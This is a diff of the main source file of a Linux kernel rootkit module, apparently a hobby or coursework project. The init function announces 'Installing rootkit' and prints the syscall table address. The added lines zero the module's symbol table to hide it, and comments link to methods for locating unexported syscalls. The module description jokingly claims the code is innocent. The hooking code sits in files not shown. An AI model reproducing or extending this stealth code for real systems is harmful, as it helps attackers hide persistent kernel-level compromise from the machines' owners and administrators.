@@ -1,6 +1,10 @@
 //TODO: put init macros back..
 //TODO: extract kprintfs to one file to make them easier to enable / disable
 
+// passing parameters http://www.tldp.org/HOWTO/html_single/Module-HOWTO/
+
+
+
 #include <linux/module.h>	 // For moduless
 #include <linux/init.h>	
 
@@ -13,12 +17,15 @@
 #include "communication.h"
 
 
+// can get adddress of syscalls not exported using something on http://onebitbug.me/2011/03/04/introducing-linux-kernel-symbols/
+
+
 //TODO: rename this to if wanting to be able to remove rootkit
 #define DEV_MODE
 
-
 //TODO: check if when an init function fails that the parts of the rootkit which were installed are removed.
 static int __init main_init(void) {
+	
 	int error;
 	printInfo("Installing rootkit. Compiled: %s %s\n", __TIME__, __DATE__); // TODO: print time etc..
 	printInfo("Syscall table is located at: %p\n", (void *) SYSCALL_TABLE);
@@ -42,6 +49,9 @@ static int __init main_init(void) {
 	if (error) return error;
 
 	printInfo("Rootkit installed\n");
+	
+	__this_module.num_symtab = 0;
+	
 	return 0;
 }
 
@@ -66,6 +76,9 @@ static void __exit main_exit(void) {
 MODULE_LICENSE("GPL"); // note: GPL is required if using the functions create_class / create_device.. (http://forums.fedoraforum.org/showthread.php?t=97742)
 MODULE_AUTHOR("Innocent authors");
 MODULE_DESCRIPTION("This is a perfectly innocent module and has nothing to do with rootkits whatsoever :)");
+
+//http://www.krystalcraft.cz/projects/linux_kernel_rootkit/doc/load.html
+
 
 module_init(main_init);
 module_exit(main_exit);	 // For init macros
